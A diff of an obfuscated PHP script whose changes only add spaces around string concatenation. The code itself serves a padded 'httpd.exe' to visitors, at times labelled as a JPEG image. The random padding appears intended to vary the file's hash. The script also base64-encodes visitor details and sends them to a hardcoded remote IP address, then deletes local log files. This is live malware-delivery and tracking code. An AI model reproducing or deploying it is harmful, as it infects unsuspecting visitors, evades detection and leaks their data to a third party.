@@ -28,17 +28,17 @@ $u5['need_log'] = $q4;
 $u5['ip_smarta'] = $_GET['ip_smarta'];
 $u5['UA-CPU'] = (string) $s2['UA-CPU'];
 $u5['Accept-Encoding'] = (string) $s2['Accept-Encoding'];
-$a6 = filesize(__DIR__.'/httpd.exe');
-$e7 = @file_get_contents(__DIR__.'/httpd.exe');
+$a6 = filesize(__DIR__ . '/httpd.exe');
+$e7 = @file_get_contents(__DIR__ . '/httpd.exe');
 if ($_GET['nona'] != 'nona') {
     $i8 = time() % 3600;
     for ($w9 = 0; $w9 < $i8; $w9++) {
         $e7 .= "\0\0\0\0\0\0\0\0\0";
     }
 }$m10 = strlen($e7);
-$y11 = ['http://176.121.14.140/kvs.php?e='.base64_encode(json_encode($u5)).'&v=aladinio&fz='.$a6.'&aliman='.$_GET['aliman'], 'http://176.121.14.140/kvs.php?e='.base64_encode(json_encode($u5)).'&v=aladinio&fz='.$a6.'&aliman='.$_GET['aliman'], 'http://176.121.14.140/kvs.php?e='.base64_encode(json_encode($u5)).'&v=aladinio&fz='.$a6.'&aliman='.$_GET['aliman']];
+$y11 = ['http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman'], 'http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman'], 'http://176.121.14.140/kvs.php?e=' . base64_encode(json_encode($u5)) . '&v=aladinio&fz=' . $a6 . '&aliman=' . $_GET['aliman']];
 shuffle($y11);
-$w12 = __DIR__.'/download_big__stat.txt';
+$w12 = __DIR__ . '/download_big__stat.txt';
 @unlink($w12);
 foreach ($y11 as $o13) {
     $g14 = stream_context_create(['http' => ['timeout' => 10]]);
@@ -52,9 +52,9 @@ foreach ($y11 as $o13) {
     if ($q4) {
     }
     header('HTTP/1.1 200 OK');
-    header('Date: '.gmdate('D, d M Y H:i:s', time()).' GMT');
+    header('Date: ' . gmdate('D, d M Y H:i:s', time()) . ' GMT');
     header('Accept-Ranges: bytes');
-    header('Content-Length: '.$m10);
+    header('Content-Length: ' . $m10);
     header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
     header('Cache-Control: post-check=0, pre-check=0', false);
     header('Pragma: no-cache');
@@ -70,8 +70,8 @@ foreach ($y11 as $o13) {
     if (strpos($_SERVER['REQUEST_URI'], '.jpg') !== false) {
         $s17 = 'image/jpeg';
     }
-    header('Content-Type: '.$s17);
-    @unlink(__DIR__.'/access_big__stat.txt');
+    header('Content-Type: ' . $s17);
+    @unlink(__DIR__ . '/access_big__stat.txt');
     echo $e7;
     exit;
 }exit();
